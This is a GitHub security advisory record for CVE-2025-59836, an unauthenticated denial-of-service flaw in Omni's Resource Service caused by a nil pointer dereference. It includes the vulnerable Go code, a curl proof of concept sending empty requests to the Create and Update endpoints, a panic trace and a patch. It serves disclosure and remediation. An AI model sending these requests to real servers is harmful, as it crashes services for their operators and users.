advisory_id: GHSA-4p3p-cr38-v5xp
datasource_id: github_osv_importer_v2/GHSA-4p3p-cr38-v5xp
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-4p3p-cr38-v5xp/GHSA-4p3p-cr38-v5xp.json
aliases:
  - CVE-2025-59836
summary: "Omni is Vulnerable to DoS via Empty Create/Update Resource Requests\n## Summary\n\n\
  A nil pointer dereference vulnerability in the Omni Resource Service allows unauthenticated\
  \ users to cause a server panic and denial of service by sending empty create/update resource\
  \ requests through the API endpoints.\n\n## Details\n\nThe vulnerability exists in the `isSensitiveSpec`\
  \ function which calls `grpcomni.CreateResource` without checking if the resource's metadata\
  \ field is nil. When a resource is created with an empty `Metadata` field, the `CreateResource`\
  \ function attempts to access `resource.Metadata.Version` causing a segmentation fault.\n\n\
  ### Vulnerable Code\n\nThe `isSensitiveSpec` function in `/src/internal/backend/server.go`:\n\
  \n```go\nfunc isSensitiveSpec(resource *resapi.Resource) bool {\n    res, err := grpcomni.CreateResource(resource)\
  \  // No nil check on resource.Metadata\n    if err != nil {\n        return false\n    }\n\
  \    // ... rest of function\n}\n```\n\nThe `CreateResource` function expects `resource.Metadata`\
  \ to be non-nil:\n\n```go\nfunc CreateResource(resource *resources.Resource) (cosiresource.Resource,\
  \ error) {\n    if resource.Metadata.Version == \"\" {  // PANIC: nil pointer dereference\n\
  \        resource.Metadata.Version = \"1\"\n    }\n    // ... rest of function\n}\n```\n\n\
  The `UpdateResource` function has the same issue - it also calls `CreateResource` internally\
  \ and expects `resource.Metadata` to be non-nil:\n\n```go\nfunc (s *ResourceServer) Update(ctx\
  \ context.Context, in *resapi.UpdateRequest) (*resapi.UpdateResponse, error) {\n    // ...\
  \ validation code ...\n    obj, err := CreateResource(in.Resource)  // Same vulnerability\
  \ here\n    if err != nil {\n        return nil, err\n    }\n    // ... rest of function\n\
  }\n```\n\n### Affected Endpoints\n\n- `resourceServerCreate` - Create Resource API endpoint\n\
  - `resourceServerUpdate` - Update Resource API endpoint\n\nBoth endpoints call `isSensitiveSpec`\
  \ which triggers the vulnerability when processing empty resources.\n\n## PoC\n\nSend empty\
  \ resource requests to the affected API endpoints:\n\n```bash\n# Create endpoint\ncurl -X\
  \ POST \"https://your-omni-instance/api/omni.resources.ResourceService/Create\" \\\n  -H \"\
  Content-Type: application/json\" \\\n  -d '{}'\n\n# Update endpoint  \ncurl -X POST \"https://your-omni-instance/api/omni.resources.ResourceService/Update\"\
  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}'\n```\n\n**Expected Result**: Server\
  \ panic with segmentation fault:\n\n```\npanic: runtime error: invalid memory address or nil\
  \ pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x293d970]\n\
  \ngoroutine 3305 [running]:\ngithub.com/siderolabs/omni/internal/backend/grpc.CreateResource(0x3495420?)\n\
  \        /src/internal/backend/grpc/resource.go:364 +0x20\n```\n\n## Impact\n\n- **Vulnerability\
  \ Type**: Denial of Service (DoS)\n- **Severity**: High - Complete API server crash requiring\
  \ manual restart if no restart policy is applied.\n- **Authentication**: None required (unauthenticated)\n\
  - **Complexity**: Low (simple HTTP request)\n\n## Mitigation\n\nAdd nil checks in the `isSensitiveSpec`\
  \ function:\n\n```go\nfunc isSensitiveSpec(resource *resapi.Resource) bool {\n    if resource\
  \ == nil || resource.Metadata == nil {\n        return false\n    }\n    res, err := grpcomni.CreateResource(resource)\n\
  \    if err != nil {\n        return false\n    }\n    // ... rest of function\n}\n```\n\n\
  ## Credits\n- @1c3t0rm\n- @nicomda"
impacted_packages: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-4p3p-cr38-v5xp/GHSA-4p3p-cr38-v5xp.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-476
references:
  - url: https://github.com/siderolabs/omni
    reference_type:
    reference_id:
  - url: https://github.com/siderolabs/omni/commit/1396083f766a1b0380e9949968d7fc17b7afecaa
    reference_type:
    reference_id:
  - url: https://github.com/siderolabs/omni/commit/1fd954af64985a8b3dbf5b11deddbf7cd953f5ae
    reference_type:
    reference_id:
  - url: https://github.com/siderolabs/omni/security/advisories/GHSA-4p3p-cr38-v5xp
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-59836
    reference_type:
    reference_id:
  - url: https://pkg.go.dev/vuln/GO-2025-4021
    reference_type:
    reference_id:
